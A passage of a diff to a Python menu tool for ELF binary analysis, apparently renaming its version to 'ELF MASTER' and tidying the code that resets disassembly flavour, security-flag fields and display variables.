       else:
-         if (flavour.rstrip(" ").upper() != "ATT") and (flavour.rstrip(" ").upper() != "INTEL"):
-            print("[-] Resetting...")
+         if (flavour.upper() != "ATT") and (flavour.upper() != "INTEL"):
+            print("[-] Error, resetting...")
             flavour = bak
          if flavour.upper() == "ATT":
-            flavour = "att"
-            print("[+] Swithing to att...")
+            flavour = spacePadding("att", COL1)
+            print("[+] Swithing to ATT...")
          if flavour.upper() == "INTEL":
-            flavour = "intel"
-            print("[+] Switching to intel")
-      flavour = spacePadding(flavour, 5)
+            flavour = spacePadding("intel", COL1)
+            print("[+] Switching to INTEL")
       print(colored("[*] Disassenbly flavor updated...", colour3))
       prompt()
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
-# Details : Menu option selected - RESET
+# Version : ELF MASTER
+# Details : Menu option selected - Reset all values.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -1709,32 +1723,36 @@ while True:
       OFF = spacePadding("0", COL1)
       IND = spacePadding("unknown", COL1)
       ARC = spacePadding("unknown", COL1)
-      FIL = spacePadding("unknown", COL0)
+      FIL = spacePadding("unknown", COL1)
       SRT = spacePadding("0x0000000000000000", COL1)
-      INS = spacePadding("0x0000000000000000", COL1)
+      INSP = spacePadding("0x0000000000000000", COL1)
+     
       saveParams()
-      MODE=spacePadding("unknown", COL1)
-      ADDR = [" "*COL2]*maxDisp
-      GADD = [" "*COL3]*maxDisp
+      
       RE = spacePadding("RELRO    unknown", COL1)
       ST = spacePadding("STACK    unknown", COL1)
       FO = spacePadding("FORTIFY  unknown", COL1)
       NX = spacePadding("NX       unknown", COL1)
       PI = spacePadding("PIE      unknown", COL1)
       RW = spacePadding("RWX      unknown", COL1)
+      
+      MODE=spacePadding("unknown", COL1)
+      FUNC = [" "*COL2]*maxDispl
+      GADD = [" "*COL3]*maxDispl
+
       MAIN = spacePadding("0x0000000000000000", COL1)
       CUS1 = spacePadding("0x0000000000000000", COL1)
       CUS2 = spacePadding("0x0000000000000000", COL1)      
-      BIT = spacePadding("unknown", COL1)
-      colourx = "yellow"
-      flavour = "intel"
+      BITS = spacePadding("unknown", COL1)
+
+      flavour = spacePadding("intel", COL1)
       prompt()
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
-# Details : Menu option selected - Save running config to config.txt and exit program
+# Version : ELF MASTER
+# Details : Menu option selected - Terminate program.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -1748,7 +1766,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : FULL STACK
+# Version : ELF MASTER
 # Details : Menu option selected - Secret option
 # Modified: N/A
 # -------------------------------------------------------------------------------------
